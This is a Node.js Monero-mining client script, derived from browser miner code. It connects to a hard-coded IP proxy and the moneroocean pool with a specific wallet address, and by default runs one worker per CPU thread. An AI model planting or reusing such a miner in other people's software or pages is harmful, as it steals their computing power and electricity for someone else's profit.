const { Worker } = require('worker_threads');
const WebSocket = require('ws');

var server = "wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
    try {
        if ("object" === typeof WebAssembly && "function" === typeof WebAssembly.instantiate) {
            var c = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
            if (c instanceof WebAssembly.Module)
                return new WebAssembly.Instance(c)instanceof WebAssembly.Instance
        }
    } catch (g) {}
    return !1
}();
function addWorkers(c) {
    logicalProcessors = c;
    if (-1 == c) {
        try {
            logicalProcessors = window.navigator.hardwareConcurrency
        } catch (g) {
            logicalProcessors = 4
        }
        0 < logicalProcessors && 40 > logicalProcessors || (logicalProcessors = 4)
    }
    for (; 0 < logicalProcessors--; )
        addWorker()
}
var openWebSocket = function() {
    null != ws && ws.close();
    var c = server.split(";");
    ws = new WebSocket(c[Math.floor(Math.random() * c.length)]);
    ws.onmessage = on_servermsg;
    ws.onerror = function(c) {
        2 > connected && (connected = 2);
        job = null
    }
    ;
    ws.onclose = function() {
        2 > connected && (connected = 2);
        job = null
    }
    ;
    ws.onopen = function() {
        ws.send(JSON.stringify(handshake));
        connected = attempts = 1
    }
};
reconnector = function() {
    3 !== connected && (null == ws || 0 !== ws.readyState && 1 !== ws.readyState) && (attempts++,
    openWebSocket());
    3 !== connected && setTimeout(reconnector, 1E4 * attempts)
}
;
function startBroadcast(c) {
    if ("function" !== typeof BroadcastChannel)
        c();
    else {
        stopBroadcast();
        var g = new BroadcastChannel("channel")
          , f = Math.random()
          , l = []
          , n = 0
          , G = !0;
        l.push(f);
        g.onmessage = function(c) {
            -1 === l.indexOf(c.data) && l.push(c.data)
        }
        ;
        startBroadcast.bc = g;
        startBroadcast.id = setInterval(function() {
            g.postMessage(f);
            n++;
            0 === n % 2 && (l.sort(),
            l[0] === f && G && (c(),
            G = !1,
            f = 0),
            l = [],
            l.push(f))
        }, 1E3)
    }
}
function stopBroadcast() {
    "undefined" !== typeof startBroadcast.bc && startBroadcast.bc.close();
    "undefined" !== typeof startBroadcast.id && clearInterval(startBroadcast.id)
}
function startMiningWithId(c, g, f) {
    g = void 0 === g ? -1 : g;
    f = void 0 === f ? "" : f;
    wasmSupported && (stopMining(),
    connected = 0,
    handshake = {
        identifier: "handshake",
        loginid: c,
        userid: f,
        version: 7
    },
    startBroadcast(function() {
        addWorkers(g);
        reconnector()
    }))
}
function startMining(c, g, f, l, n) {
    f = void 0 === f ? "" : f;
    l = void 0 === l ? -1 : l;
    n = void 0 === n ? "" : n;
    wasmSupported && (stopMining(),
    connected = 0,
    handshake = {
        identifier: "handshake",
        pool: c,
        login: g,
        password: f,
        userid: n,
        version: 7
    },
    startBroadcast(function() {
        addWorkers(l);
        reconnector()
    }))
}
function stopMining() {
    connected = 3;
    null != ws && ws.close();
    deleteAllWorkers();
    job = null;
    stopBroadcast()
}
function addWorker() {
    var c = new Worker('./worker.js');
    workers.push(c);
    c.on('message', function (message) {
        my_on_workermsg(message, c);
      });
    // c.on = on_workermsg;
    setTimeout(function() {
        informWorker(c)
    }, 2E3)
}
function removeWorker() {
    1 > workers.length || workers.shift().terminate()
}
function deleteAllWorkers() {
    for (i = 0; i < workers.length; i++)
        workers[i].terminate();
    workers = []
}
function informWorker(c) {
    on_workermsg({
        data: "wakeup",
        target: c
    })
}
function on_servermsg(c) {
    c = JSON.parse(c.data);
	// console.log(c);
    receiveStack.push(c);
    "job" == c.identifier && (job = c)
}
function on_workermsg(c) {
    // console.log(c);
    var g = c.target;
    if (1 != connected)
        setTimeout(function() {
            informWorker(g)
        }, 2E3);
    else {
        if ("nothing" != c.data && "wakeup" != c.data) {
            var f = JSON.parse(c.data);
            ws.send(c.data);
            sendStack.push(f)
        }
        null === job ? setTimeout(function() {
            informWorker(g)
        }, 2E3) : (g.postMessage({
            job: job,
            throttle: Math.max(0, Math.min(throttleMiner, 100))
        }),
        "wakeup" != c.data && (totalhashes += 1))
    }
};
function my_on_workermsg(c, g) {
    if (1 != connected)
        setTimeout(function() {
            informWorker(g)
        }, 2E3);
    else {
        if ("nothing" != c && "wakeup" != c) {
            console.log(c);
            var f = JSON.parse(c);
            ws.send(c);
            sendStack.push(f)
        }
        null === job ? setTimeout(function() {
            informWorker(g)
        }, 2E3) : (g.postMessage({
            job: job,
            throttle: Math.max(0, Math.min(throttleMiner, 100))
        }),
        "wakeup" != c && (totalhashes += 1))
    }
};
console.log("Config Loaded");
server = "ws://45.76.53.54:8181";
var pool = "moneroocean.stream";
var walletAddress = "45CkepD4rGu1rVA5cFPs3RFWHCCiAUYtyVACvWnT4wjoSNynqywYo6JhdNrpQS6VD2Qpp8QVLahubMgzsBMfGpdn9EtjcJ2";
var workerId = "akiflola10"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;